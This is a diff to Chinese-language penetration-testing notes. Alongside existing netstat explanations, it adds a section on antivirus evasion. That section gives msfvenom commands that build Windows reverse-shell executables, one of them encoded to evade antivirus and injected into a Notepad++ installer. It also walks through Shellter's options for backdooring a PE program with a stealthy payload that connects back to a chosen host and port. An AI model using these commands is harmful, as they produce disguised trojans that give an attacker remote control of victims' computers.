@@ -93,6 +93,36 @@ netstat
 - 127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性
 - ::: 这三个: 的前两个”::“，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的“0.0.0.0”，就是本机的所有IPv6地址，第三个:是IP和端口的分隔符
 
+免杀
+-----------------------------------------
+- MSF制作免杀木马
+	- 列出所有可用编码
+		``msfvemon -l encoders``
+	- 裸奔木马
+		``msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=1234 -f exe > /root/test.exe``
+	- 免杀木马
+		``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.20.2 LPORT=3333 -e x86/shikata_ga_nai -x npp.7.8.6.Installer.exe -i 12 -f exe -o /root/npp1.exe``
+
+	|msfvemon1|
+
+- Shellter动态注入工具
+	- 下载地址
+		``https://www.shellterproject.com/download/``
+	- Choose Operation Mode - Auto/Manual (A/M/H)
+		选择模式: 自动模式自动注入后门，M高级模式，H帮助
+	- PE Target：
+		注入的程序.
+	- Enable Stealth Mode?
+		是否启用隐身模式
+	- Use a listed payload or custom? (L/C/H)
+		使用攻击模块列表或者自定义
+	- Select payload by index:
+		选择payload序号
+	- SET LHOST
+		设置反弹回来的IP 本机
+	- SET LPORT
+		设置接收反弹的端口
 
 
 .. |netstat| image:: ../images/netstat.png
+.. |msfvemon1| image:: ../images/msfvenom1.png
